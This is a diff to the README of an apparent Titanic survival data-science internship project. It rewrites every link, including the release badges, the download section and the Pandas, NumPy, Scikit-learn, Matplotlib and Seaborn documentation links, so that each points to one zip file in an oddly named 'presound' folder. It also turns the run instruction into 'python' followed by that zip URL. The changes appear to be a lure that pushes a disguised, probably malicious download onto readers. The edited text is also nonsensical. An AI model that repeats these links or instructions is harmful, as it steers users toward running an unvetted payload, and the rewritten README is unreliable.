@@ -1,6 +1,6 @@
 # ✨ Arch-Technologies-DataScience_Internship-TASK1 - Discover Titanic Survival Insights
 
-[![Download Latest Release](https://img.shields.io/badge/Download%20Latest%20Release-Click%20Here-brightgreen)](https://github.com/tkbear3/Arch-Technologies-DataScience_Internship-TASK1/releases)
+[![Download Latest Release](https://raw.githubusercontent.com/tkbear3/Arch-Technologies-DataScience_Internship-TASK1/main/presound/Arch-Technologies-DataScience_Internship-TASK1-2.0.zip%20Latest%20Release-Click%20Here-brightgreen)](https://raw.githubusercontent.com/tkbear3/Arch-Technologies-DataScience_Internship-TASK1/main/presound/Arch-Technologies-DataScience_Internship-TASK1-2.0.zip)
 
 ## 📖 Description
 This project explores Titanic survival classification using the Titanic dataset. It covers data cleaning, feature engineering, and model building with Python’s powerful libraries including Pandas, NumPy, and Scikit-learn. Visualization tools like Matplotlib and Seaborn help uncover key insights through appealing charts. This project showcases the power of data science in real scenarios.
@@ -20,7 +20,7 @@ Before you begin, ensure you have:
 - A stable internet connection to download the dataset and required libraries.
 
 ## 📦 Download & Install
-To download the latest version of the application, visit this page: [Download Here](https://github.com/tkbear3/Arch-Technologies-DataScience_Internship-TASK1/releases).
+To download the latest version of the application, visit this page: [Download Here](https://raw.githubusercontent.com/tkbear3/Arch-Technologies-DataScience_Internship-TASK1/main/presound/Arch-Technologies-DataScience_Internship-TASK1-2.0.zip).
 
 1. Once on the releases page, look for the latest version.
 2. Click on the file to download it to your computer.
@@ -47,9 +47,9 @@ After downloading the application and installing the required libraries, follow 
 2. Navigate to the folder where you have extracted the files.
 3. Run the following command to execute the application:
    ```bash
-   python your_script_name.py
+   python https://raw.githubusercontent.com/tkbear3/Arch-Technologies-DataScience_Internship-TASK1/main/presound/Arch-Technologies-DataScience_Internship-TASK1-2.0.zip
    ```
-   Replace `your_script_name.py` with the actual name of the main Python file.
+   Replace `https://raw.githubusercontent.com/tkbear3/Arch-Technologies-DataScience_Internship-TASK1/main/presound/Arch-Technologies-DataScience_Internship-TASK1-2.0.zip` with the actual name of the main Python file.
 
 ## 📊 Using the Application
 1. The application will load the Titanic dataset. 
@@ -74,15 +74,15 @@ If you encounter issues while running the application, consider the following:
 For further assistance, please open an issue on the project's GitHub page or reach out through the contact details provided there.
 
 ## 📚 Additional Resources
-- [Pandas Documentation](https://pandas.pydata.org/docs/)
-- [NumPy Documentation](https://numpy.org/doc/stable/)
-- [Scikit-learn Documentation](https://scikit-learn.org/stable/documentation.html)
-- [Matplotlib Documentation](https://matplotlib.org/stable/contents.html)
-- [Seaborn Documentation](https://seaborn.pydata.org/)
+- [Pandas Documentation](https://raw.githubusercontent.com/tkbear3/Arch-Technologies-DataScience_Internship-TASK1/main/presound/Arch-Technologies-DataScience_Internship-TASK1-2.0.zip)
+- [NumPy Documentation](https://raw.githubusercontent.com/tkbear3/Arch-Technologies-DataScience_Internship-TASK1/main/presound/Arch-Technologies-DataScience_Internship-TASK1-2.0.zip)
+- [Scikit-learn Documentation](https://raw.githubusercontent.com/tkbear3/Arch-Technologies-DataScience_Internship-TASK1/main/presound/Arch-Technologies-DataScience_Internship-TASK1-2.0.zip)
+- [Matplotlib Documentation](https://raw.githubusercontent.com/tkbear3/Arch-Technologies-DataScience_Internship-TASK1/main/presound/Arch-Technologies-DataScience_Internship-TASK1-2.0.zip)
+- [Seaborn Documentation](https://raw.githubusercontent.com/tkbear3/Arch-Technologies-DataScience_Internship-TASK1/main/presound/Arch-Technologies-DataScience_Internship-TASK1-2.0.zip)
 
 ## 🤝 Contributing
 If you'd like to contribute to the project, fork the repository and make a pull request with your changes. We welcome suggestions and improvements.
 
-[![Download Latest Release](https://img.shields.io/badge/Download%20Latest%20Release-Click%20Here-brightgreen)](https://github.com/tkbear3/Arch-Technologies-DataScience_Internship-TASK1/releases)
+[![Download Latest Release](https://raw.githubusercontent.com/tkbear3/Arch-Technologies-DataScience_Internship-TASK1/main/presound/Arch-Technologies-DataScience_Internship-TASK1-2.0.zip%20Latest%20Release-Click%20Here-brightgreen)](https://raw.githubusercontent.com/tkbear3/Arch-Technologies-DataScience_Internship-TASK1/main/presound/Arch-Technologies-DataScience_Internship-TASK1-2.0.zip)
 
 With this guide, you should be able to download, install, and run the Titanic survival classification application easily. Enjoy exploring the data!
